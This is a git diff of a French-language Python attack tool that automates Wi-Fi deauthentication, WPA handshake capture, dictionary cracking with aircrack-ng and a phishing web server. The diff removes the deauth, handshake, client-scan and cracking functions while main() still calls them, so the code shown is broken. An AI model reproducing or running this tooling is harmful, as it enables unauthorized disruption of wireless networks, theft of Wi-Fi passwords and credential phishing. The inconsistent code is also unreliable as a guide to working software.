@@ -43,13 +43,21 @@ def run_cmd(cmd, capture=False):
         return result.stdout if capture else None
     except Exception as e:
         console.print(f"[red]Erreur : {e}[/red]")
+        return ""
 
 def check_root():
     if os.geteuid() != 0:
         console.print("[bold red]Ce script doit être lancé avec sudo ![/bold red]")
         sys.exit(1)
 
-# === MODE MONITOR ===
+# === DETECTE SI MODE MONITOR POSSIBLE ===
+def monitor_supported():
+    iw_output = run_cmd("iw list", capture=True)
+    if iw_output and "* monitor" in iw_output:
+        return True
+    return False
+
+# === DETECTE INTERFACE WIFI ===
 def detect_wifi_interface():
     output = run_cmd("iw dev", capture=True)
     for line in output.splitlines():
@@ -57,17 +65,32 @@ def detect_wifi_interface():
             return line.split()[1]
     return None
 
+# === MODE MONITOR ON/OFF ===
 def start_monitor_mode(iface):
+    console.print("[yellow]Tentative activation mode monitor...[/yellow]")
     run_cmd("airmon-ng check kill")
     run_cmd(f"airmon-ng start {iface}")
     time.sleep(2)
-    return iface + "mon" if iface + "mon" in run_cmd("iw dev", capture=True) else None
+    iwdev = run_cmd("iw dev", capture=True)
+    mon_iface = None
+    for line in iwdev.splitlines():
+        if iface+"mon" in line:
+            mon_iface = iface+"mon"
+            break
+    if mon_iface:
+        console.print(f"[green]Mode monitor activé sur {mon_iface}[/green]")
+        return mon_iface
+    else:
+        console.print("[red]Mode monitor non activé, interface monitor introuvable.[/red]")
+        return None
 
 def stop_monitor_mode(mon_iface):
-    run_cmd(f"airmon-ng stop {mon_iface}")
-    run_cmd("service NetworkManager restart")
+    if mon_iface:
+        run_cmd(f"airmon-ng stop {mon_iface}")
+        run_cmd("service NetworkManager restart")
+        console.print("[green]Retour au mode managed.[/green]")
 
-# === SCAN WIFI ===
+# === SCAN WIFI (managed ou monitor) ===
 def parse_scan_output(output):
     nets = []
     cells = output.split("Cell ")
@@ -90,12 +113,26 @@ def parse_scan_output(output):
         })
     return nets
 
-def scan_wifi(monitor_iface):
-    console.print("[cyan]Scan des réseaux WiFi...[/cyan]")
+def scan_wifi_managed(iface):
+    console.print("[cyan]Scan WiFi (mode managed)...[/cyan]")
+    output = run_cmd(f"iwlist {iface} scan", capture=True)
+    if not output:
+        console.print("[red]Erreur: Impossible de scanner avec iwlist.[/red]")
+        return []
+    return parse_scan_output(output)
+
+def scan_wifi_monitor(monitor_iface):
+    console.print("[cyan]Scan WiFi (mode monitor)...[/cyan]")
     output = run_cmd(f"iwlist {monitor_iface} scan", capture=True)
+    if not output:
+        console.print("[red]Erreur: Impossible de scanner avec iwlist.[/red]")
+        return []
     return parse_scan_output(output)
 
 def show_networks(nets):
+    if not nets:
+        console.print("[yellow]Aucun réseau détecté.[/yellow]")
+        return
     table = Table(title="Réseaux WiFi détectés", style="bold magenta")
     table.add_column("ID", justify="center")
     table.add_column("SSID", justify="left")
@@ -107,52 +144,6 @@ def show_networks(nets):
         color = "green" if n["Signal"] > -70 else "yellow" if n["Signal"] > -85 else "red"
         table.add_row(str(i+1), n["SSID"], n["BSSID"], n["Channel"], f"[{color}]{n['Signal']}[/]", n["Enc"])
     console.print(table)
-
-# === SCAN CLIENTS & DEAUTH ===
-def scan_clients(bssid, channel, monitor_iface):
-    console.print(f"[cyan]Scan des clients connectés à {bssid}...[/cyan]")
-    cmd = f"airodump-ng --bssid {bssid} --channel {channel} --write clients_scan --output-format csv {monitor_iface}"
-    run_cmd(f"timeout 10 {cmd}")
-    clients = []
-    if os.path.exists("clients_scan-01.csv"):
-        with open("clients_scan-01.csv") as f:
-            lines = f.readlines()
-            start = False
-            for line in lines:
-                if start:
-                    parts = [x.strip() for x in line.split(",")]
-                    if len(parts) > 0 and re.match(r"([0-9A-F]{2}:){5}[0-9A-F]{2}", parts[0]):
-                        clients.append(parts[0])
-                if "Station MAC" in line:
-                    start = True
-    return clients
-
-def deauth_attack(target_mac, bssid, monitor_iface):
-    console.print(f"[red]Déauth attaque sur {target_mac if target_mac else 'tous'}...[/red]")
-    packets = 100
-    with Progress(SpinnerColumn(), BarColumn(), TextColumn("{task.description}"), TimeElapsedColumn(), console=console) as progress:
-        task = progress.add_task("Envoi paquets...", total=packets)
-        for i in range(packets):
-            cmd = f"aireplay-ng --deauth 1 -a {bssid}"
-            if target_mac:
-                cmd += f" -c {target_mac}"
-            cmd += f" {monitor_iface}"
-            run_cmd(cmd)
-            progress.update(task, advance=1)
-
-# === HANDSHAKE CAPTURE ===
-def capture_handshake(bssid, channel, monitor_iface):
-    os.makedirs(HANDSHAKE_DIR, exist_ok=True)
-    file_path = os.path.join(HANDSHAKE_DIR, f"handshake_{bssid.replace(':','_')}")
-    console.print(f"[cyan]Capture handshake sur {bssid}...[/cyan]")
-    run_cmd(f"airodump-ng --bssid {bssid} --channel {channel} --write {file_path} {monitor_iface}")
-    console.print(f"[green]Handshake sauvegardé dans {file_path}-01.cap[/green]")
-
-# === CRACK WPA ===
-def crack_wpa(cap_file, wordlist):
-    console.print(f"[cyan]Crack WPA avec dictionnaire {wordlist}...[/cyan]")
-    cmd = f"aircrack-ng {cap_file} -w {wordlist}"
-    run_cmd(cmd)
 
 # === PHISHING SERVER ===
 class PhishHandler(http.server.SimpleHTTPRequestHandler):
@@ -182,7 +173,7 @@ class PhishHandler(http.server.SimpleHTTPRequestHandler):
 def start_phishing_server():
     global template_path
     while True:
-        template_path = Prompt.ask("[cyan]Chemin fichier HTML template[/cyan]")
+        template_path = Prompt.ask("[cyan]Chemin fichier HTML template (doit finir par .html)[/cyan]")
         if template_path.endswith(".html") and os.path.exists(template_path):
             break
         else:
@@ -209,18 +200,26 @@ def show_history():
         table.add_row(h[0], h[1])
     console.print(table)
 
-# === MENU ===
+# === MENU PRINCIPAL ===
 def main():
     check_root()
     print_title()
     iface = detect_wifi_interface()
     if not iface:
         console.print("[red]Aucune interface WiFi détectée.[/red]")
-        return
-    monitor_iface = start_monitor_mode(iface)
-    if not monitor_iface:
-        console.print("[red]Impossible d'activer mode monitor.[/red]")
-        return
+        sys.exit(1)
+    console.print(f"[green]Interface WiFi détectée: {iface}[/green]")
+
+    monitor = False
+    mon_iface = None
+    if monitor_supported():
+        mon_iface = start_monitor_mode(iface)
+        if mon_iface:
+            monitor = True
+        else:
+            console.print("[yellow]Mode monitor non disponible, utilisation du mode managed.[/yellow]")
+    else:
+        console.print("[yellow]Mode monitor non supporté par cette carte, utilisation du mode managed.[/yellow]")
 
     try:
         while True:
@@ -229,53 +228,78 @@ def main():
             table.add_column("Option", justify="center")
             table.add_column("Action", justify="left")
             table.add_row("1", "Scanner réseaux WiFi")
-            table.add_row("2", "Voir clients + Déauth")
-            table.add_row("3", "Capture handshake WPA")
-            table.add_row("4", "Lancer phishing (template .html)")
-            table.add_row("5", "Crack WPA avec dictionnaire")
-            table.add_row("6", "Voir historique")
-            table.add_row("7", "Quitter")
-            console.print(table)
+            if monitor:
+                table.add_row("2", "Voir clients + Déauth (mode monitor)")
+                table.add_row("3", "Capture handshake WPA (mode monitor)")
+                table.add_row("4", "Lancer phishing (template .html)")
+                table.add_row("5", "Crack WPA avec dictionnaire")
+                table.add_row("6", "Voir historique")
+                table.add_row("7", "Quitter")
+                console.print(table)
+                choices = ["1","2","3","4","5","6","7"]
+            else:
+                table.add_row("2", "Lancer phishing (template .html)")
+                table.add_row("3", "Voir historique")
+                table.add_row("4", "Quitter")
+                console.print(table)
+                choices = ["1","2","3","4"]
 
-            choice = IntPrompt.ask("Choix", choices=["1","2","3","4","5","6","7"])
+            choice = IntPrompt.ask("Choix", choices=choices)
+
             if choice == 1:
-                nets = scan_wifi(monitor_iface)
+                if monitor:
+                    nets = scan_wifi_monitor(mon_iface)
+                else:
+                    nets = scan_wifi_managed(iface)
                 if nets:
                     show_networks(nets)
                     history.append((datetime.now().strftime("%H:%M:%S"), "Scan WiFi"))
                 else:
                     console.print("[red]Aucun réseau trouvé.[/red]")
             elif choice == 2:
-                bssid = Prompt.ask("[cyan]BSSID cible[/cyan]")
-                channel = Prompt.ask("[cyan]Canal[/cyan]")
-                clients = scan_clients(bssid, channel, monitor_iface)
-                if clients:
-                    console.print(f"[green]Clients trouvés: {', '.join(clients)}[/green]")
-                    target = Prompt.ask("[cyan]MAC cible ou 'all'[/cyan]")
-                    if target.lower() == "all":
-                        target = None
-                    deauth_attack(target, bssid, monitor_iface)
+                if monitor:
+                    bssid = Prompt.ask("[cyan]BSSID cible[/cyan]")
+                    channel = Prompt.ask("[cyan]Canal[/cyan]")
+                    clients = scan_clients(bssid, channel, mon_iface)
+                    if clients:
+                        console.print(f"[green]Clients trouvés: {', '.join(clients)}[/green]")
+                        target = Prompt.ask("[cyan]MAC cible ou 'all'[/cyan]")
+                        if target.lower() == "all":
+                            target = None
+                        deauth_attack(target, bssid, mon_iface)
+                    else:
+                        console.print("[yellow]Aucun client détecté.[/yellow]")
                 else:
-                    console.print("[yellow]Aucun client détecté.[/yellow]")
+                    start_phishing_server()
+                    history.append((datetime.now().strftime("%H:%M:%S"), "Phishing lancé"))
             elif choice == 3:
-                bssid = Prompt.ask("[cyan]BSSID cible[/cyan]")
-                channel = Prompt.ask("[cyan]Canal[/cyan]")
-                capture_handshake(bssid, channel, monitor_iface)
+                if monitor:
+                    bssid = Prompt.ask("[cyan]BSSID cible[/cyan]")
+                    channel = Prompt.ask("[cyan]Canal[/cyan]")
+                    capture_handshake(bssid, channel, mon_iface)
+                else:
+                    show_history()
             elif choice == 4:
-                start_phishing_server()
-            elif choice == 5:
+                if monitor:
+                    start_phishing_server()
+                else:
+                    console.print("[green]Arrêt et sortie...[/green]")
+                    break
+            elif choice == 5 and monitor:
                 cap_file = Prompt.ask("[cyan]Chemin fichier .cap[/cyan]")
                 wordlist = Prompt.ask("[cyan]Chemin wordlist[/cyan]")
                 crack_wpa(cap_file, wordlist)
-            elif choice == 6:
+            elif choice == 6 and monitor:
                 show_history()
-            elif choice == 7:
+            elif (choice == 7 and monitor) or (choice == 4 and not monitor):
                 console.print("[green]Arrêt et retour mode managed...[/green]")
-                stop_monitor_mode(monitor_iface)
+                if monitor:
+                    stop_monitor_mode(mon_iface)
                 break
     except KeyboardInterrupt:
         console.print("\n[red]Interruption détectée, nettoyage...[/red]")
-        stop_monitor_mode(monitor_iface)
+        if monitor:
+            stop_monitor_mode(mon_iface)
 
 if __name__ == "__main__":
     main()
